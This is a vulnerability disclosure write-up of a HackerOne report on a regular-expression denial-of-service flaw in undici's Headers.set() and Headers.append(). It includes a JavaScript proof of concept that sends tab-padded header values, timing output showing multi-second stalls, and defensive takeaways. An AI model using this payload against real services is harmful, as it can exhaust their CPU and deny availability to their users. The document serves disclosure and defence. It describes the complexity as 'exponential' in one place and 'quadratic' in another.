# Regular Expression Denial of Service (ReDoS) in Headers Class

## Metadata
- **Source:** HackerOne
- **Report:** 1784449 | https://hackerone.com/reports/1784449
- **Submitted:** 2022-11-25
- **Reporter:** sno2
- **Program:** undici
- **Bounty:** Not specified in report
- **Severity:** Medium
- **Vuln:** Regular Expression Denial of Service (ReDoS), Algorithmic Complexity Attack
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Headers.set() and Headers.append() methods in undici are vulnerable to ReDoS attacks through an inefficient regular expression in the headerValueNormalize() utility function. An attacker can cause processing delays of several seconds by crafting header values containing repeated tab characters, potentially disrupting service availability.

## Attack scenario
1. Attacker identifies an application using undici library to process HTTP requests with user-supplied headers
2. Attacker crafts a malicious HTTP request containing a crafted header value (e.g., 'a' followed by 50,000+ tab characters)
3. Application receives the request and passes the untrusted header value to Headers.set() or Headers.append()
4. The vulnerable regex in headerValueNormalize() enters catastrophic backtracking when processing the tab-heavy payload
5. Application thread becomes CPU-bound, consuming significant processing resources for 2-3+ seconds
6. If multiple concurrent requests are sent, attacker can exhaust server resources and cause denial of service

## Root cause
The headerValueNormalize() function uses an inefficient regular expression pattern to normalize HTTP header values. The regex exhibits catastrophic backtracking behavior when encountering strings with many consecutive tab characters, causing exponential time complexity relative to input length.

## Attacker mindset
An attacker targeting availability would recognize that HTTP header processing is often on the critical path of request handling. By exploiting ReDoS in a widely-used library like undici, they could amplify impact across multiple applications. The attack requires minimal payload crafting and can be triggered remotely through standard HTTP mechanisms.

## Defensive takeaways
- Replace inefficient regex patterns with iterative algorithms or optimized regex that avoids catastrophic backtracking
- Implement timeout mechanisms for regex operations on untrusted input
- Use regex analysis tools to identify backtracking-prone patterns during code review
- Consider input validation/length limits on header values before processing
- Monitor CPU usage spikes correlated with specific request patterns
- Prefer whitelist-based validation over complex regex patterns for security-critical parsing

## Variant hunting
Search for similar regex-based header/value normalization in other HTTP clients and parsers. Check for patterns normalizing whitespace (tabs, spaces, newlines) with lazy quantifiers or alternation constructs. Review fetch API polyfills and HTTP header handling utilities for vulnerable regex usage.

## MITRE ATT&CK
- T1498.2
- T1499.4

## Notes
This is a classic ReDoS vulnerability demonstrating quadratic time complexity degradation. Performance scales from <1ms to ~3 seconds with 50x input increase. The vulnerability affects all versions using the flawed regex and can be triggered by any application accepting untrusted HTTP headers.

## Full report
<details><summary>Expand</summary>

**Summary:** ReDoS vulnerabilities in Headers class.

**Description:** The `Headers.set()` and `Headers.append()` methods are vulnerable to Regular Expression Denial of Service (ReDoS) attacks when untrusted values are passed into the functions.  This is due to the inefficient regular expression used to normalize the values in the `headerValueNormalize()` utility function.

## Steps To Reproduce:

  1. Install undici (npm install undici@5.13)
  2. Run the following program:
```js
const { Headers } = require("undici");

const headers = new Headers();
const attack = "a" + "\t".repeat(50_000) + "\ta";
const start = performance.now();
headers.append("foo", attack);
console.log(`${performance.now() - start}ms`);
```

## Impact: The code takes almost 3 seconds to run because of the inefficient regular expression used in `Headers.append()`

## Supporting Material/References:
  * Cause of vulnerability: https://github.com/nodejs/undici/blob/main/lib/fetch/headers.js#L18-L30
  * Both the `Headers.set()` and `Headers.append()` functions are affected.
```js
const { Headers } = require("undici");

console.log("Headers.set()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.set("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}

console.log("\nHeaders.append()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.append("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

```txt
Headers.set()
3: 0.4767999998293817ms
10003: 108.30930000031367ms
20003: 417.9063999997452ms
30003: 949.7406999999657ms
40003: 1662.9593000002205ms
50003: 2645.8285000002943ms

Headers.append()
3: 0.27730000019073486ms
10003: 111.98060000035912ms
20003: 430.24649999989197ms
30003: 996.5332000004128ms
40003: 1706.5194999999367ms
50003: 2932.2003999999724ms
```

## Impact

An attacker can immobilize an unsuspecting user of this package for a few seconds if untrusted input is passed into the unsafe `Headers` methods.

</details>

---
*Analysed by Claude on 2026-05-24*
